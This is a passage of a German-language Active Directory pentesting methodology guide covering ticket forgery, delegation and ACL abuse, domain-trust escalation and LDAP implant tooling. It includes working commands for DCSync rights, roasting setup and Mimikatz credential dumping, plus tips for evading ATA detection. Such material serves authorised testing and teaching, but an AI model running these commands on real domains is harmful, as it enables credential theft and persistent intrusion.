Wenn einem Benutzer oder Computer "Constrained Delegation" erlaubt ist, kann er **sich als beliebiger Benutzer ausgeben, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn du dann den **Hash dieses Benutzers/Computers kompromittierst**, kannst du **dich als beliebiger Benutzer ausgeben** (sogar Domain Admins), um auf diese Dienste zuzugreifen.

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Wenn du **WRITE**-Berechtigungen auf ein Active Directory-Objekt eines entfernten Computers hast, ermöglicht das das Erlangen von Code-Ausführung mit **erhöhten Rechten**:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Berechtigungs-/ACL-Missbrauch

Der kompromittierte Benutzer könnte über interessante Privilegien an bestimmten Domänenobjekten verfügen, die es dir erlauben, lateral zu bewegen oder Privilegien zu eskalieren.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Missbrauch des Printer Spooler-Dienstes

Das Entdecken eines **lauschenen Spool-Service** innerhalb der Domäne kann ausgenutzt werden, um **neue credentials zu erlangen** und **Privilegien zu eskalieren**.

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Missbrauch von Sitzungen Dritter

Wenn **andere Benutzer** auf die **kompromittierte** Maschine zugreifen, ist es möglich, **Credentials aus dem Speicher zu sammeln** und sogar **Beacons in ihre Prozesse zu injizieren**, um sich als sie auszugeben.\
In der Regel greifen Benutzer per RDP auf das System zu, daher findest du hier, wie man ein paar Angriffe auf RDP-Sitzungen Dritter durchführt:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** stellt ein System zur Verwaltung des **lokalen Administratorpassworts** auf domänengebundenen Computern bereit, stellt sicher, dass es **zufällig**, einzigartig und häufig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert und der Zugriff wird durch ACLs nur für autorisierte Benutzer kontrolliert. Mit ausreichenden Rechten zum Lesen dieser Passwörter wird Pivoting zu anderen Computern möglich.

{{#ref}}
laps.md
{{#endref}}

### Zertifikatdiebstahl

Das **Sammeln von Zertifikaten** von der kompromittierten Maschine kann ein Weg sein, Privilegien innerhalb der Umgebung zu eskalieren:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Missbrauch von Zertifikatvorlagen

Wenn **verwundbare templates** konfiguriert sind, ist es möglich, sie zu missbrauchen, um Privilegien zu eskalieren:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-Exploitation mit einem Konto mit hohen Rechten

### Dumping von Domain-Credentials

Sobald du **Domain Admin** oder noch besser **Enterprise Admin** Rechte erhältst, kannst du die **Domänen-Datenbank**: _ntds.dit_ **auslesen**.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Einige der zuvor besprochenen Techniken können zur Persistenz verwendet werden.\
Zum Beispiel könntest du:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver Ticket attack** erstellt ein **legitimes Ticket Granting Service (TGS) Ticket** für einen bestimmten Dienst, indem der **NTLM-Hash** (z. B. der **Hash des PC-Kontos**) verwendet wird. Diese Methode wird eingesetzt, um auf die **Dienstprivilegien** zuzugreifen.

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Eine **Golden Ticket attack** bedeutet, dass ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Kontos** in einer Active Directory (AD)-Umgebung erhält. Dieses Konto ist besonders, da es zum Signieren aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung im AD-Netzwerk notwendig sind.

Sobald der Angreifer diesen Hash erlangt hat, kann er **TGTs** für jedes beliebige Konto erstellen (Silver ticket attack).

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese sind ähnlich wie Golden Tickets, die so gefälscht werden, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Zertifikate Account-Persistenz**

**Zertifikate eines Kontos zu besitzen oder sie anfordern zu können** ist ein sehr guter Weg, um im Benutzerkonto persistieren zu können (selbst wenn das Passwort geändert wird):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Zertifikate Domain-Persistenz**

**Die Verwendung von Zertifikaten ermöglicht ebenfalls Persistenz mit hohen Privilegien innerhalb der Domäne:**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory sichert die Sicherheit **privilegierter Gruppen** (wie Domain Admins und Enterprise Admins), indem es eine standardisierte **Access Control List (ACL)** auf diese Gruppen anwendet, um unautorisierte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden; wenn ein Angreifer die ACL des AdminSDHolder ändert, um einem normalen Benutzer Vollzugriff zu gewähren, erhält dieser Benutzer umfassende Kontrolle über alle privilegierten Gruppen. Dieses Sicherheitsmerkmal, das zum Schutz gedacht ist, kann somit ins Gegenteil umschlagen und unbegründeten Zugang ermöglichen, wenn es nicht genau überwacht wird.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Auf jedem **Domain Controller (DC)** existiert ein **lokales Administrator**-Konto. Wenn man Admin-Rechte auf einer solchen Maschine erlangt, kann der lokale Administrator-Hash mit **mimikatz** extrahiert werden. Anschließend ist eine Änderung in der Registry notwendig, um die Nutzung dieses Passworts zu **ermöglichen**, wodurch der Remotezugriff auf das lokale Administrator-Konto ermöglicht wird.

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** bestimmte **Sonderberechtigungen** über spezifische Domänenobjekte gewähren, die es dem Benutzer erlauben, in der Zukunft **Privilegien zu eskalieren**.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** werden verwendet, um die **Berechtigungen** zu speichern, die ein Objekt über ein anderes Objekt hat. Wenn du nur eine **kleine Änderung** am **security descriptor** eines Objekts vornehmen kannst, kannst du sehr interessante Privilegien über dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Speicher, um ein **universelles Passwort** zu etablieren, das Zugang zu allen Domänenkonten gewährt.

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst dein eigenes **SSP** erstellen, um die **Credentials** im **Klartext** abzufangen, die zum Zugriff auf die Maschine verwendet werden.

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Es registriert einen **neuen Domain Controller** im AD und nutzt diesen, um Attribute (SIDHistory, SPNs...) auf bestimmten Objekten zu **pushen**, ohne dabei **Logs** über die **Änderungen** zu hinterlassen. Du benötigst **DA**-Rechte und musst in der **root domain** sein.\
Beachte, dass bei Verwendung falscher Daten durchaus hässliche Logs entstehen können.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Zuvor haben wir besprochen, wie man Privilegien eskalieren kann, wenn man **ausreichende Rechte hat, um LAPS-Passwörter zu lesen**. Diese Passwörter können jedoch auch verwendet werden, um **Persistenz** aufrechtzuerhalten.\
Siehe:

{{#ref}}
laps.md
{{#endref}}

## Forest-Privilegieneskalation - Domain Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Das bedeutet, dass **die Kompromittierung einer einzigen Domäne potenziell zum Kompromittieren des gesamten Forests führen kann**.

### Grundlegende Informationen

Ein [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der einem Benutzer aus einer **Domäne** ermöglicht, auf Ressourcen in einer anderen **Domäne** zuzugreifen. Er stellt eine Verknüpfung zwischen den Authentifizierungssystemen der beiden Domänen her, sodass Authentifizierungsanfragen nahtlos weitergeleitet werden können. Wenn Domänen eine Vertrauensstellung einrichten, tauschen sie bestimmte **Keys** zwischen ihren **Domain Controllern (DCs)** aus und speichern diese, da sie für die Integrität der Vertrauensstellung entscheidend sind.

In einem typischen Szenario, wenn ein Benutzer auf einen Dienst in einer **vertrauten Domäne** zugreifen möchte, muss er zuerst ein spezielles Ticket, ein **inter-realm TGT**, vom DC seiner eigenen Domäne anfordern. Dieses TGT ist mit einem gemeinsam genutzten **Key** verschlüsselt, auf den sich beide Domänen geeinigt haben. Der Benutzer präsentiert dieses TGT dann dem **DC der vertrauenswürdigen Domäne**, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des inter-realm TGT durch den DC der vertrauenswürdigen Domäne, stellt dieser ein TGS aus, das dem Benutzer den Zugriff auf den Dienst gewährt.

**Schritte**:

1. Ein **Client-Computer** in **Domain 1** startet den Prozess, indem er seinen **NTLM-Hash** verwendet, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert dann ein **inter-realm TGT** von DC1 an, das benötigt wird, um auf Ressourcen in **Domain 2** zuzugreifen.
4. Das inter-realm TGT ist mit einem **trust key** verschlüsselt, der zwischen DC1 und DC2 als Teil der zweiseitigen Domain-Trust geteilt wird.
5. Der Client bringt das inter-realm TGT zum **Domain Controller (DC2)** von **Domain 2**.
6. DC2 überprüft das inter-realm TGT mit seinem gemeinsamen trust key und stellt, falls gültig, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich präsentiert der Client dieses TGS dem Server, welches mit dem Account-Hash des Servers verschlüsselt ist, um Zugriff auf den Dienst in Domain 2 zu erhalten.

### Verschiedene Trusts

Es ist wichtig zu beachten, dass **eine Vertrauensstellung einseitig oder zweiseitig sein kann**. Bei der zweiseitigen Option vertrauen beide Domänen einander, während bei einer **einseitigen** Vertrauensbeziehung eine der Domänen die **vertrauende** und die andere die **vertrauende** Domäne ist. In diesem Fall kannst du **nur** von der vertrauenden Domäne aus auf Ressourcen der vertrauenden Domäne zugreifen.

Wenn Domain A Domain B vertraut, ist A die trusting domain und B die trusted domain. Zudem ist dies in **Domain A** eine **Outbound trust**; und in **Domain B** eine **Inbound trust**.

**Verschiedene Vertrauensbeziehungen**

- **Parent-Child Trusts**: Üblich innerhalb desselben Forests, wobei eine Child-Domäne automatisch eine zweiseitige transitive Vertrauensstellung mit ihrer Parent-Domäne hat. Das bedeutet, dass Authentifizierungsanfragen nahtlos zwischen Parent und Child fließen können.
- **Cross-link Trusts**: Auch als "shortcut trusts" bezeichnet, werden diese zwischen Child-Domänen eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssten Authentifizierungs-Referrals typischerweise zur Forest-Root hoch und dann zur Ziel-Domäne herunter reisen. Durch Cross-links wird dieser Weg verkürzt, was besonders in geografisch verteilten Umgebungen vorteilhaft ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht verwandten Domänen eingerichtet und sind nicht-transitiv. Laut [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind external trusts nützlich, um auf Ressourcen in einer Domäne außerhalb des aktuellen Forests zuzugreifen, die nicht durch einen Forest-Trust verbunden ist. Die Sicherheit wird durch SID-Filtering bei external trusts erhöht.
- **Tree-root Trusts**: Diese Vertrauensstellungen werden automatisch zwischen der Forest-Root-Domäne und einem neu hinzugefügten Tree-Root hergestellt. Sie sind zwar nicht häufig, aber wichtig, um neue Domain-Trees in einen Forest aufzunehmen, ihnen einen eindeutigen Domänennamen zu ermöglichen und die wechselseitige Transitivität sicherzustellen. Weitere Informationen in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Trust ist eine zweiseitige transitive Vertrauensstellung zwischen zwei Forest-Root-Domänen und erzwingt ebenfalls SID-Filtering, um die Sicherheit zu erhöhen.
- **MIT Trusts**: Diese Trusts werden mit nicht-Windows, [RFC4120-konformen](https://tools.ietf.org/html/rfc4120) Kerberos-Domänen eingerichtet. MIT trusts sind etwas spezialisierter und dienen Umgebungen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erfordern.

#### Weitere Unterschiede in **Vertrauensbeziehungen**

- Eine Vertrauensstellung kann auch **transitiv** (A vertraut B, B vertraut C, dann vertraut A C) oder **nicht-transitiv** sein.
- Eine Vertrauensstellung kann als **bidirektionale Trust** (beide vertrauen einander) oder als **einseitige Trust** (nur eine vertraut der anderen) konfiguriert werden.

### Angriffspfad

1. **Enumeriere** die Vertrauensbeziehungen
2. Prüfe, ob irgendein **security principal** (User/Group/Computer) **Zugriff** auf Ressourcen der **anderen Domäne** hat, möglicherweise durch ACE-Einträge oder durch Mitgliedschaft in Gruppen der anderen Domäne. Suche nach **Beziehungen über Domänen hinweg** (wahrscheinlich wurde der Trust dafür erstellt).
3. Kerberoast könnte in diesem Fall eine weitere Option sein.
4. **Kompromittiere** die **Accounts**, die durch Domänen pivoten können.

Angreifer können über drei Hauptmechanismen auf Ressourcen in einer anderen Domäne zugreifen:

- **Lokale Gruppenmitgliedschaft**: Principals können zu lokalen Gruppen auf Maschinen hinzugefügt werden, z. B. der „Administrators“-Gruppe auf einem Server, was ihnen weitreichende Kontrolle über diese Maschine gewährt.
- **Mitgliedschaft in Gruppen der Fremddomäne**: Principals können auch Mitglieder von Gruppen in der fremden Domäne sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Umfang der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** aufgeführt sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, wodurch ihnen Zugriff auf bestimmte Ressourcen gewährt wird. Für tiefergehende Informationen zu ACLs, DACLs und ACEs ist das Whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” eine wertvolle Ressource.

### Finde externe Benutzer/Gruppen mit Berechtigungen

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** prüfen, um Foreign Security Principals in der Domäne zu finden. Dabei handelt es sich um Benutzer/Gruppen aus **einer externen Domäne/einem externen Forest**.

Du kannst das in **Bloodhound** prüfen oder mit powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Weitere Möglichkeiten, enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 trusted keys**, eine für _Child --> Parent_ und eine andere für _Parent_ --> _Child_.\
> Du kannst die von der aktuellen Domain verwendete mit folgendem Befehl prüfen:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise admin in die child/parent domain eskalieren, indem man den Trust mit SID-History Injection ausnutzt:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zu verstehen, wie die Configuration Naming Context (NC) ausgenutzt werden kann, ist entscheidend. Die Configuration NC dient als zentrales Repository für Konfigurationsdaten über einen Forest in Active Directory (AD)-Umgebungen. Diese Daten werden an jeden Domain Controller (DC) innerhalb des Forest repliziert; writable DCs halten eine schreibbare Kopie der Configuration NC. Um dies auszunutzen, benötigt man **SYSTEM privileges on a DC**, vorzugsweise auf einem child DC.

**Link GPO to root DC site**

Der Sites-Container der Configuration NC enthält Informationen über die Sites aller domain-joined computers innerhalb des AD-Forest. Mit SYSTEM-Rechten auf einem beliebigen DC können Angreifer GPOs mit den root DC sites verknüpfen. Diese Aktion kann die root domain kompromittieren, indem Richtlinien manipuliert werden, die auf diese Sites angewendet werden.

For more in-depth information, see research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Ein Angriffsvektor zielt auf privilegierte gMSAs innerhalb der Domain ab. Der KDS Root key, der für die Berechnung von gMSA-Passwörtern erforderlich ist, wird in der Configuration NC gespeichert. Mit SYSTEM-Rechten auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter für beliebige gMSAs im gesamten Forest zu berechnen.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Diese Methode erfordert Geduld und das Warten auf die Erstellung neuer privilegierter AD-Objekte. Mit SYSTEM-Rechten kann ein Angreifer das AD Schema verändern, um jedem Benutzer vollständige Kontrolle über alle Klassen zu gewähren. Dies kann zu unbefugtem Zugriff und Kontrolle über neu erstellte AD-Objekte führen.

Further reading: [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-Schwachstelle zielt auf die Kontrolle über PKI-Objekte ab, um eine certificate template zu erstellen, die die Authentifizierung als beliebiger Benutzer im Forest ermöglicht. Da PKI-Objekte in der Configuration NC liegen, ermöglicht das Kompromittieren eines writable child DC die Ausführung von ESC5-Angriffen.

Mehr dazu in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In Umgebungen ohne ADCS kann der Angreifer die notwendigen Komponenten selbst einrichten, wie in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario vertraut eine externe Domäne **deiner Domäne** und gewährt dir dadurch **unbestimmte Berechtigungen** darauf. Du musst herausfinden, **welche principals deiner Domäne welche Zugriffsrechte auf die externe Domäne haben** und dann versuchen, diese auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domäne - Einseitig (Ausgehend)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario vertraut **deine Domain** einem Principal aus **einer anderen Domain** bestimmte **privileges**.

Allerdings, wenn eine **domain is trusted** von der trusting domain, erstellt die trusted domain einen **user** mit einem **vorhersehbaren Namen**, der als **password das trusted password** nutzt. Das bedeutet, dass es möglich ist, einen **user aus der trusting domain** zu nutzen, um in die trusted Domain zu gelangen, diese zu enumerieren und zu versuchen, weitere Privilegien zu eskalieren:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine andere Möglichkeit, die trusted domain zu kompromittieren, ist das Finden eines [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), das in die **entgegengesetzte Richtung** des Domain-Trusts erstellt wurde (was nicht sehr häufig vorkommt).

Eine weitere Möglichkeit, die trusted domain zu kompromittieren, besteht darin, auf einer Maschine zu warten, auf die ein **user from the trusted domain can access** per **RDP** zugreift. Der Angreifer könnte dann Code in den RDP-Session-Prozess injizieren und von dort **access the origin domain of the victim**.\
Außerdem, wenn der **Victim seine Festplatte gemountet** hat, könnte der Angreifer vom **RDP session**-Prozess aus **backdoors** im **Startup-Ordner der Festplatte** ablegen. Diese Technik heißt **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Maßnahmen gegen Missbrauch von Domain-Trusts

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID history-Attribut über forest trusts ausnutzen, wird durch SID Filtering gemindert, das standardmäßig auf allen inter-forest trusts aktiviert ist. Dies basiert auf der Annahme, dass intra-forest trusts sicher sind, da laut Microsoft das forest und nicht die domain als Sicherheitsgrenze betrachtet wird.
- Allerdings gibt es einen Haken: SID Filtering kann Anwendungen und den Benutzerzugriff stören und wird daher gelegentlich deaktiviert.

### **Selective Authentication:**

- Bei inter-forest trusts sorgt der Einsatz von Selective Authentication dafür, dass Benutzer aus den beiden forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domains und Server innerhalb der trusting domain oder des forests zugreifen können.
- Es ist wichtig zu beachten, dass diese Maßnahmen nicht vor der Ausnutzung des writable Configuration Naming Context (NC) oder vor Angriffen auf das trust account schützen.

[**Mehr Informationen zu Domain-Trusts auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-basierter AD-Missbrauch durch On-Host-Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-style LDAP-Primitiven als x64 Beacon Object Files neu, die vollständig innerhalb eines On-Host-Implants (z. B. Adaptix C2) laufen. Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann `ldap <subcommand>` vom Beacon auf. Der gesamte Traffic verwendet den aktuellen Logon-Sicherheitskontext über LDAP (389) mit signing/sealing oder LDAPS (636) mit automatischem Zertifikatstrust, sodass keine Socks-Proxies oder Disk-Artefakte erforderlich sind.

### Implant-seitige LDAP-Enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` lösen kurze Namen/OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute`, and `get-domaininfo` ziehen beliebige Attribute (einschließlich security descriptors) sowie die forest/domain-Metadaten aus `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` legen roasting candidates, Delegationseinstellungen und existierende [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-Deskriptoren direkt aus LDAP offen.
- `get-acl` and `get-writable --detailed` parsen die DACL, um Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/attribute writes) und Vererbung aufzulisten und bieten sofortige Ziele für ACL-Privilege-Eskalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue principals oder Maschinenkonten dort zu platzieren, wo OU-Rechte vorhanden sind. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` kapern Ziele direkt, sobald write-property-Rechte gefunden werden.
- ACL-fokussierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` übersetzen WriteDACL/WriteOwner auf jedem AD-Objekt in Passwort-Resets, Gruppenmitgliedschaftskontrolle oder DCSync-Replikationsrechte, ohne PowerShell/ADSI-Artefakte zu hinterlassen. `remove-*` Gegenstücke räumen injizierte ACEs wieder auf.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort kerberoastable; `add-asreproastable` (UAC-Toggle) markiert ihn für AS-REP roasting, ohne das Passwort zu verändern.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` vom Beacon um, ermöglichen constrained/unconstrained/RBCD-Angriffswege und eliminieren die Notwendigkeit für remote PowerShell oder RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht so eine heimliche Vererbung von Zugriffen vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/OU von Computern oder Benutzern und erlaubt es einem Angreifer, Assets in OUs zu verschieben, in denen bereits delegierte Rechte bestehen, bevor `set-password`, `add-groupmember` oder `add-spn` missbraucht werden.
- Eng gefasste Entfernen-Befehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` usw.) erlauben ein schnelles Rollback, nachdem der Operator Anmeldeinformationen oder Persistenz ernten konnte, und minimieren Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Abwehrmaßnahmen

[**Erfahren Sie hier mehr darüber, wie Sie Anmeldeinformationen schützen können.**](../stealing-credentials/credentials-protections.md)

### **Defensive Maßnahmen zum Schutz von Anmeldeinformationen**

- **Domain Admins Restrictions**: Es wird empfohlen, dass Domain Admins sich nur an Domain Controllern anmelden dürfen und ihre Verwendung auf anderen Hosts vermieden wird.
- **Service Account Privileges**: Dienste sollten nicht mit Domain Admin (DA)-Rechten ausgeführt werden, um die Sicherheit zu gewährleisten.
- **Temporal Privilege Limitation**: Für Aufgaben, die DA-Rechte benötigen, sollte deren Dauer begrenzt werden. Dies kann z. B. erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 überwachen und anschließend LDAP signing sowie LDAPS channel binding auf DCs/Clients erzwingen, um LDAP MITM/relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementierung von Deception-Techniken**

- Die Implementierung von Deception beinhaltet das Aufstellen von Fallen, wie Köderbenutzern oder -computern, mit Eigenschaften wie Passwörtern, die nicht ablaufen oder die als Trusted for Delegation markiert sind. Ein detaillierter Ansatz umfasst das Erstellen von Benutzern mit spezifischen Rechten oder das Hinzufügen zu hochprivilegierten Gruppen.
- Ein praktisches Beispiel verwendet Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mehr zum Einsatz von Deception-Techniken finden Sie auf [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Erkennung von Deception**

- **For User Objects**: Verdächtige Indikatoren sind untypische ObjectSID, seltene Anmeldungen, Erstellungsdaten und niedrige Counts für fehlgeschlagene Passwortversuche.
- **General Indicators**: Der Vergleich von Attributen potenzieller Köderobjekte mit echten Objekten kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können bei der Identifizierung solcher Deceptions helfen.

### **Umgehen von Erkennungssystemen**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermeiden der Sitzungserfassung auf Domain Controllern, um ATA-Detektion zu verhindern.
- **Ticket Impersonation**: Die Verwendung von **aes**-Keys zur Erstellung von Tickets hilft, Erkennung zu umgehen, da so kein Downgrade zu NTLM erfolgt.
- **DCSync Attacks**: Es wird empfohlen, DCSync von einem Nicht-Domain Controller auszuführen, um ATA-Detektion zu vermeiden, da direkte Ausführung von einem Domain Controller Alarme auslöst.

## Referenzen

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
